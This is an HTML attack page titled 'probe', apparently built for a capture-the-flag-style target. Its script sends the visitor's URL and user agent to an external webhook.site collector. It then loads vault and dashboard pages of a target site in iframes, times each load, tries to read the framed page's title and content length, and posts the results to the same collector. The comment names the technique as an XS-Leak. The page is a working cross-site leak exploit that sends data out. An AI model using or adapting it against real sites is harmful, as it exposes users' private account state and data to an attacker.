<!doctype html>
<html><head><meta charset="utf-8"><title>probe</title></head><body>
<h1>probe</h1>
<script>
var W = 'https://webhook.site/bea63c09-d731-4803-932f-5722c4e62a7b';
function log(k, v) { try { fetch(W, {method:'POST', mode:'no-cors', body: '[' + k + '] ' + String(v).slice(0,2500)}); } catch(e){} }
log('hit', location.href);
log('ua', navigator.userAgent);
// A) iframe 加载 + onload 计时 + 内容长度探测（XS-Leak）
var targets = [
  ['items', 'https://catdrive.b4nk4.tech/vault/items'],
  ['history', 'https://catdrive.b4nk4.tech/vault/history'],
  ['dashboard', 'https://catdrive.b4nk4.tech/dashboard'],
];
var idx = 0;
function next() {
  if (idx >= targets.length) { log('leak-done', 'all'); return; }
  var t = targets[idx++];
  var f = document.createElement('iframe');
  f.style.cssText = 'width:600px;height:400px;border:1px solid #000';
  var t0 = Date.now();
  var done = false;
  f.onload = function() {
    var dt = Date.now() - t0;
    var info = 'loaded dt=' + dt;
    try {
      var d = f.contentDocument;
      info += ' doc=' + (d ? 'READABLE' : 'null');
      if (d) info += ' title=' + d.title + ' len=' + d.body.innerHTML.length;
    } catch(e) { info += ' exc=' + e.name; }
    log('iframe-' + t[0], info + ' url=' + f.src);
    done = true;
    setTimeout(next, 500);
  };
  f.onerror = function() { log('iframe-' + t[0] + '-ERR', 'onerror dt=' + (Date.now()-t0)); done = true; setTimeout(next, 500); };
  document.body.appendChild(f);
  setTimeout(function(){ if(!done) { log('iframe-' + t[0] + '-TIMEOUT', 'no load within 8s'); next(); } }, 8000);
}
next();
log('dispatched', 'LEAK_V1');
</script>
</body></html>
